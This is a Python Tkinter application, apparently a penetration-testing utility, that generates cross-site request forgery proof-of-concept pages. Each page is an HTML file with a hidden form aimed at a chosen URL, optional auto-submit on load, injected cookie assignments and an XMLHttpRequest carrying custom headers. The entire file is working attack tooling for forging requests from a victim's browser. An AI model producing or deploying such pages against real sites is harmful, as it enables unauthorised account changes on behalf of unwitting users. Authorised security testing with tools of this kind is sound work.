import tkinter as tk
from tkinter import ttk, messagebox, Menu
import os
import json

# Default settings
default_settings = {
    "save_directory": "saves",
    "default_method": "POST",
    "auto_submit": True,
    "include_head": True,
}

# Load settings from file
def load_settings():
    global settings
    if os.path.exists("settings.json"):
        with open("settings.json", "r") as file:
            settings = json.load(file)
            # Ensure new keys exist in settings
            for key, value in default_settings.items():
                if key not in settings:
                    settings[key] = value
    else:
        settings = default_settings.copy()

# Save settings to file
def save_settings():
    with open("settings.json", "w") as file:
        json.dump(settings, file)

# Apply theme (only light mode)
def apply_theme():
    style.theme_use("default")
    style.configure("TFrame", background="white")
    style.configure("TLabel", background="white", foreground="black")
    style.configure("TEntry", background="white", foreground="black")
    style.configure("TButton", background="white", foreground="black")
    style.configure("TCheckbutton", background="white", foreground="black")

# Open settings window
def open_settings():
    settings_window = tk.Toplevel(root)
    settings_window.title("Settings")
    settings_window.geometry("400x300")

    ttk.Label(settings_window, text="Default Save Directory:").grid(row=0, column=0, sticky=tk.W, padx=10, pady=10)
    save_dir_entry = ttk.Entry(settings_window, width=40)
    save_dir_entry.insert(0, settings["save_directory"])
    save_dir_entry.grid(row=0, column=1, padx=10, pady=10)

    ttk.Label(settings_window, text="Default HTTP Method:").grid(row=1, column=0, sticky=tk.W, padx=10, pady=10)
    default_method_var = tk.StringVar(value=settings["default_method"])
    default_method_combobox = ttk.Combobox(settings_window, textvariable=default_method_var)
    default_method_combobox['values'] = ('POST', 'GET', 'HEAD', 'PUT', 'DELETE')
    default_method_combobox.grid(row=1, column=1, padx=10, pady=10)

    ttk.Label(settings_window, text="Enable Auto-submit:").grid(row=2, column=0, sticky=tk.W, padx=10, pady=10)
    auto_submit_var = tk.BooleanVar(value=settings["auto_submit"])
    auto_submit_check = ttk.Checkbutton(settings_window, variable=auto_submit_var)
    auto_submit_check.grid(row=2, column=1, padx=10, pady=10)

    ttk.Label(settings_window, text="Include Head:").grid(row=3, column=0, sticky=tk.W, padx=10, pady=10)
    include_head_var = tk.BooleanVar(value=settings["include_head"])
    include_head_check = ttk.Checkbutton(settings_window, variable=include_head_var)
    include_head_check.grid(row=3, column=1, padx=10, pady=10)

    def save_and_apply_settings():
        settings["save_directory"] = save_dir_entry.get()
        settings["default_method"] = default_method_var.get()
        settings["auto_submit"] = auto_submit_var.get()
        settings["include_head"] = include_head_var.get()
        save_settings()
        settings_window.destroy()

    ttk.Button(settings_window, text="Save Settings", command=save_and_apply_settings).grid(row=4, column=0, columnspan=2, pady=20)

def validate_input_data(input_data_str):
    try:
        if input_data_str:
            dict(pair.split('=') for pair in input_data_str.split('&'))
        return True
    except Exception:
        return False

def generate_csrf_poc(method, target_url, input_data, auto_submit, custom_headers, cookies, include_head):
    if method not in ['POST', 'GET', 'HEAD', 'PUT', 'DELETE']:
        raise ValueError("Unsupported method. Use POST, GET, HEAD, PUT, or DELETE.")

    headers = {}
    if custom_headers:
        headers = dict(header.split(': ') for header in custom_headers.split('&'))

    cookies_script = ""
    if cookies:
        cookies_list = cookies.split('&')
        cookies_script = '\n'.join([f"        document.cookie = '{cookie}';" for cookie in cookies_list])

    html_template = "<!DOCTYPE html>\n<html>\n"

    if include_head:
        html_template += """
<head>
    <title>CSRF PoC</title>
    <meta charset="UTF-8">
</head>
"""

    html_template += """
<body>
    <h4>Loading...</h4>
    <form id="csrf_form" action="{target_url}" method="{method}">
""".format(target_url=target_url, method=method)

    if input_data:
        input_data_dict = dict(pair.split('=') for pair in input_data.split('&'))
        for key, value in input_data_dict.items():
            html_template += f'        <input type="hidden" name="{key}" value="{value}">\n'

    html_template += """
    </form>
"""

    if auto_submit or cookies or custom_headers:
        html_template += "<script>\n"
        if cookies_script:
            html_template += cookies_script + "\n"
        if custom_headers:
            html_template += "        var xhr = new XMLHttpRequest();\n"
            html_template += f'        xhr.open("{method}", "{target_url}", true);\n'
            for header_name, header_value in headers.items():
                html_template += f'        xhr.setRequestHeader("{header_name}", "{header_value}");\n'
            html_template += "        var formData = new FormData(document.getElementById('csrf_form'));\n"
            html_template += "        xhr.send(formData);\n"
        if auto_submit:
            html_template += "        document.forms[0].submit();\n"
        html_template += "</script>\n"

    html_template += """
</body>
</html>
"""

    return html_template.strip()

def save_csrf_poc(html_content, name):
    if not os.path.exists(settings["save_directory"]):
        os.makedirs(settings["save_directory"])

    if name and name != 'CSRF_PoC':
        file_name = f"CSRF_PoC_{name}.html"
    else:
        base_name = "CSRF_PoC"
        file_name = f"{base_name}.html"
        counter = 1
        while os.path.exists(os.path.join(settings["save_directory"], file_name)):
            file_name = f"{base_name}_{counter}.html"
            counter += 1

    file_path = os.path.join(settings["save_directory"], file_name)
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(html_content)
    
    messagebox.showinfo("Success", f"CSRF PoC HTML file generated: {file_path}")

preview_window = None

def preview_csrf_poc():
    global preview_window
    method = method_var.get()
    target_url = url_entry.get() if url_entry.get() != 'https://TestWebsite.com/' else ''
    input_data_str = input_data_entry.get() if input_data_entry.get() != 'email=johndoe@example.com&password=1234' else ''
    auto_submit = auto_submit_var.get()
    custom_headers = custom_headers_entry.get() if custom_headers_entry.get() != 'Content-Type: application/json&User-Agent: Mozilla/5.0' else ''
    cookies = cookies_entry.get() if cookies_entry.get() != 'sessionid=12345&csrftoken=abcdef' else ''
    include_head = include_head_var.get()

    if not validate_input_data(input_data_str):
        messagebox.showerror("Error", "Invalid input data format. Please ensure it is in key=value pairs separated by &.")
        return

    try:
        csrf_poc = generate_csrf_poc(method, target_url, input_data_str, auto_submit, custom_headers, cookies, include_head)
        if preview_window and preview_window.winfo_exists():
            text_widget = preview_window.children.get("text_widget")
            text_widget.config(state=tk.NORMAL)
            text_widget.delete(1.0, tk.END)
            text_widget.insert(tk.END, csrf_poc)
            highlight_syntax(text_widget)
            text_widget.config(state=tk.DISABLED)
        else:
            preview_window = tk.Toplevel(root)
            preview_window.title("Preview CSRF PoC")
            preview_window.geometry("800x600")  # Make the preview window wider
            text_widget = tk.Text(preview_window, wrap='word', name="text_widget")
            text_widget.insert(tk.END, csrf_poc)
            highlight_syntax(text_widget)
            text_widget.pack(expand=True, fill='both')
            text_widget.config(state=tk.DISABLED)
            text_widget.configure(background='white', foreground='black', insertbackground='black', selectbackground='light gray')
            text_widget.configure(font=("Courier", 10))
            text_widget.tag_configure("tag", font=("Courier", 10, "bold"))

    except Exception as e:
        messagebox.showerror("Error", str(e))

def highlight_syntax(text_widget):
    text_widget.tag_remove("keyword", "1.0", tk.END)
    text_widget.tag_remove("attribute", "1.0", tk.END)
    text_widget.tag_remove("value", "1.0", tk.END)
    text_widget.tag_remove("comment", "1.0", tk.END)

    text = text_widget.get("1.0", tk.END)

    keywords = ["<!DOCTYPE", "<html", "</html>", "<head>", "</head>", "<title>", "</title>", "<meta", "<body>", "</body>", "<h1>", "</h1>", "<form>", "</form>", "<input", "<script>", "</script>"]
    attributes = ["id=", "class=", "name=", "value=", "action=", "method="]

    for keyword in keywords:
        start = "1.0"
        while True:
            start = text_widget.search(keyword, start, stopindex=tk.END)
            if not start:
                break
            end = f"{start}+{len(keyword)}c"
            text_widget.tag_add("keyword", start, end)
            start = end
    text_widget.tag_configure("keyword", foreground="blue")

    for attribute in attributes:
        start = "1.0"
        while True:
            start = text_widget.search(attribute, start, stopindex=tk.END)
            if not start:
                break
            end = f"{start}+{len(attribute)}c"
            text_widget.tag_add("attribute", start, end)
            start = end
    text_widget.tag_configure("attribute", foreground="orange")

    start = "1.0"
    while True:
        start = text_widget.search(r'\"', start, stopindex=tk.END, regexp=True)
        if not start:
            break
        end = text_widget.search(r'\"', f"{start}+1c", stopindex=tk.END, regexp=True)
        if not end:
            break
        end = f"{end}+1c"
        text_widget.tag_add("value", start, end)
        start = end
    text_widget.tag_configure("value", foreground="green")

    comments = ["<!--", "-->"]
    start_comment = "1.0"
    while True:
        start_comment = text_widget.search(comments[0], start_comment, stopindex=tk.END)
        if not start_comment:
            break
        end_comment = text_widget.search(comments[1], start_comment, stopindex=tk.END)
        if not end_comment:
            break
        end_comment = f"{end_comment}+{len(comments[1])}c"
        text_widget.tag_add("comment", start_comment, end_comment)
        start_comment = end_comment
    text_widget.tag_configure("comment", foreground="gray")

def on_focus_in(event, default_text):
    if event.widget.get() == default_text:
        event.widget.delete(0, tk.END)
        event.widget.config(foreground='black')

def on_focus_out(event, default_text):
    if event.widget.get() == '':
        event.widget.insert(0, default_text)
        event.widget.config(foreground='grey')

def generate_and_save_csrf_poc():
    method = method_var.get()
    target_url = url_entry.get() if url_entry.get() != 'https://TestWebsite.com/' else ''
    input_data_str = input_data_entry.get() if input_data_entry.get() != 'email=johndoe@example.com&password=1234' else ''
    name = name_entry.get()
    auto_submit = auto_submit_var.get()
    custom_headers = custom_headers_entry.get() if custom_headers_entry.get() != 'Content-Type: application/json&User-Agent: Mozilla/5.0' else ''
    cookies = cookies_entry.get() if cookies_entry.get() != 'sessionid=12345&csrftoken=abcdef' else ''
    include_head = include_head_var.get()

    if not validate_input_data(input_data_str):
        messagebox.showerror("Error", "Invalid input data format. Please ensure it is in key=value pairs separated by &.")
        return

    try:
        csrf_poc = generate_csrf_poc(method, target_url, input_data_str, auto_submit, custom_headers, cookies, include_head)
        save_csrf_poc(csrf_poc, name)
    except Exception as e:
        messagebox.showerror("Error", str(e))

root = tk.Tk()
root.title("CSRF PoC Generator")

load_settings()

style = ttk.Style()
apply_theme()

menubar = Menu(root)
settings_menu = Menu(menubar, tearoff=0)
settings_menu.add_command(label="Settings", command=open_settings)
menubar.add_cascade(label="Menu", menu=settings_menu)
root.config(menu=menubar)

mainframe = ttk.Frame(root, padding="10 10 20 20")
mainframe.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

ttk.Label(mainframe, text="File Name (optional):").grid(row=0, column=0, sticky=tk.W)
name_entry = ttk.Entry(mainframe, width=50, foreground='grey')
name_entry.insert(0, 'CSRF_PoC')
name_entry.grid(row=0, column=1, sticky=(tk.W, tk.E))
name_entry.bind("<FocusIn>", lambda event: on_focus_in(event, 'CSRF_PoC'))
name_entry.bind("<FocusOut>", lambda event: on_focus_out(event, 'CSRF_PoC'))

ttk.Label(mainframe, text="HTTP Method:").grid(row=1, column=0, sticky=tk.W)
method_var = tk.StringVar(value=settings["default_method"])
method_combobox = ttk.Combobox(mainframe, textvariable=method_var)
method_combobox['values'] = ('POST', 'GET', 'HEAD', 'PUT', 'DELETE')
method_combobox.grid(row=1, column=1, sticky=(tk.W, tk.E))

ttk.Label(mainframe, text="Target URL:").grid(row=2, column=0, sticky=tk.W)
url_entry = ttk.Entry(mainframe, width=50, foreground='grey')
url_entry.insert(0, 'https://TestWebsite.com/')
url_entry.grid(row=2, column=1, sticky=(tk.W, tk.E))
url_entry.bind("<FocusIn>", lambda event: on_focus_in(event, 'https://TestWebsite.com/'))
url_entry.bind("<FocusOut>", lambda event: on_focus_out(event, 'https://TestWebsite.com/'))

ttk.Label(mainframe, text="Input Data (Separated by &):").grid(row=3, column=0, sticky=tk.W)
input_data_entry = ttk.Entry(mainframe, width=50, foreground='grey')
input_data_entry.insert(0, 'email=johndoe@example.com&password=1234')
input_data_entry.grid(row=3, column=1, sticky=(tk.W, tk.E))

input_data_entry.bind("<FocusIn>", lambda event: on_focus_in(event, 'email=johndoe@example.com&password=1234'))
input_data_entry.bind("<FocusOut>", lambda event: on_focus_out(event, 'email=johndoe@example.com&password=1234'))

# Optional Custom Headers and Cookies
ttk.Label(mainframe, text="Custom Headers (Separated by &):").grid(row=4, column=0, sticky=tk.W)
custom_headers_entry = ttk.Entry(mainframe, width=50, foreground='grey')
custom_headers_entry.insert(0, 'Content-Type: application/json&User-Agent: Mozilla/5.0')
custom_headers_entry.grid(row=4, column=1, sticky=(tk.W, tk.E))
custom_headers_entry.bind("<FocusIn>", lambda event: on_focus_in(event, 'Content-Type: application/json&User-Agent: Mozilla/5.0'))
custom_headers_entry.bind("<FocusOut>", lambda event: on_focus_out(event, 'Content-Type: application/json&User-Agent: Mozilla/5.0'))

ttk.Label(mainframe, text="Cookies (Separated by &):").grid(row=5, column=0, sticky=tk.W)
cookies_entry = ttk.Entry(mainframe, width=50, foreground='grey')
cookies_entry.insert(0, 'sessionid=12345&csrftoken=abcdef')
cookies_entry.grid(row=5, column=1, sticky=(tk.W, tk.E))
cookies_entry.bind("<FocusIn>", lambda event: on_focus_in(event, 'sessionid=12345&csrftoken=abcdef'))
cookies_entry.bind("<FocusOut>", lambda event: on_focus_out(event, 'sessionid=12345&csrftoken=abcdef'))

auto_submit_var = tk.BooleanVar(value=settings["auto_submit"])
auto_submit_check = ttk.Checkbutton(mainframe, text="Enable Auto-submit", variable=auto_submit_var)
auto_submit_check.grid(row=6, column=0, columnspan=1)

include_head_var = tk.BooleanVar(value=settings["include_head"])
include_head_check = ttk.Checkbutton(mainframe, text="Include Head", variable=include_head_var)
include_head_check.grid(row=6, column=1, columnspan=1)

generate_button = ttk.Button(mainframe, text="Generate", command=generate_and_save_csrf_poc)
generate_button.grid(row=7, column=0, pady=10)

preview_button = ttk.Button(mainframe, text="Preview", command=preview_csrf_poc)
preview_button.grid(row=7, column=1, pady=10)

for child in mainframe.winfo_children():
    child.grid_configure(padx=5, pady=5)

root.columnconfigure(0, weight=1)
root.rowconfigure(0, weight=1)

root.mainloop()
